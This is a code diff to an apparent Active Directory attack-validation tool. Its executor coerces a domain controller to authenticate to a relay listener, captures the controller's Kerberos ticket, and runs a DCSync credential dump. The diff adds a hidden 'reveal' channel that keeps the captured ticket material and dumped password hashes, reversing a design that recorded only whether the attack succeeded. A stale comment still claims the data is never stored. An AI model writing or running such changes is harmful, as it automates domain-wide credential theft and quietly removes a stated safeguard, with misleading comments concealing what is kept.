@@ -45,7 +45,8 @@ from typing import Any, Optional
 from ..recommend import ParamSpec, ParamValue, values
 from ..predicates import file_present_nonempty
 from .. import proof
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import key_material, dump_hashes
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv)
 from .process_manager import poll_for_capture
 from .coercion import COERCION_METHODS, coercion_trigger_argv, machine_account, _short_name
@@ -54,7 +55,7 @@ from .coercion import COERCION_METHODS, coercion_trigger_argv, machine_account, 
 # ---- UNVERIFIED DCSync success marker (see module docstring) ------------------
 # A DCSync returned replication data: a krbtgt entry, the dump banner, or a
 # secretsdump hash line (``user:rid:lm:nt:::``). Presence only -- the matched
-# content (a real secret) is NEVER captured into a variable or the receipt.
+# content lives only in the private reveal artifact, never the receipt.
 _RE_DCSYNC_OK = re.compile(
     r"(krbtgt:\d|Dumping Domain Credentials|Kerberos keys grabbed|"
     r"[^\s:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::)", re.I)
@@ -148,7 +149,18 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
         ]
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         victim_dc = v["victim_dc"]
@@ -177,7 +189,7 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "coerce"
             errors.append("gate_denied:coerce")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "coerce"
@@ -189,9 +201,16 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
         except OSError as exc:
             record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
             errors.append("listener_start_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         record("start_listener", listener_argv, None, True,
                note=f"krbrelayx on {where}")
+
+        def capture_tgt():
+            path = _captured_ccache(out_dir, sam)
+            for reveal in key_material(self.technique, "ccache", sam, path):
+                if reveal not in artifact["_reveal"]:
+                    artifact["_reveal"].append(reveal)
+            return path is not None
 
         # 2) fire the coercion trigger (synchronous) to make the DC authenticate.
         try:
@@ -205,19 +224,21 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
             # 3) poll for the captured <DC>$.ccache ARTIFACT.
             _out, captured = poll_for_capture(
                 ctx.proc_manager, handle,
-                success=lambda _o: _captured_ccache(out_dir, sam) is not None,
+                success=lambda _o: capture_tgt(),
                 interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
         finally:
+            capture_tgt()
             ctx.proc_manager.stop(handle)
 
         ccache = _captured_ccache(out_dir, sam)
+        capture_tgt()
         captured = captured or (ccache is not None)
         # Step note never carries the ccache path (it is secret-marked).
         record("tgt_capture", listener_argv, RunResult(returncode=None), captured,
                note=f"captured {sam} TGT" if captured else "no TGT captured")
         if not captured or ccache is None:
             errors.append("unconstrained_no_tgt")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         # 4) DCSync with the captured DC TGT (secretsdump -k -no-pass). ------
         # Presence-only: we test whether replication data came back, never store it.
@@ -225,12 +246,14 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
                        f"{cfg.domain}/{sam}@{victim_dc}"]
         res = ctx.runner.run(dcsync_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": ccache}, cwd=str(out_dir))
+        artifact["_reveal"].extend(dump_hashes(
+            self.technique, (res.stdout or "") + "\n" + (res.stderr or "")))
         dcsync_ok = bool(_RE_DCSYNC_OK.search((res.stdout or "") + (res.stderr or "")))
         record("dcsync", dcsync_argv, res, dcsync_ok,
                note="replication data returned" if dcsync_ok else "no replication data")
         if not dcsync_ok:
             errors.append("dcsync_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         terminal_fact = proof.build_terminal_fact(
             self.terminal_kind, ok=True,
@@ -239,7 +262,7 @@ class UnconstrainedDelegExecutor(ValidationExecutor):
             proof_token=proof.proof_token("UNCONSTRAINED-DELEG", cfg.domain, victim_dc,
                                           sam, "dcsync_krbtgt"),
             extra={"victim": sam, "method": method})
-        return self._artifact(steps, gate, mutation, terminal_fact, True, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, True, errors)
 
     @staticmethod
     def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
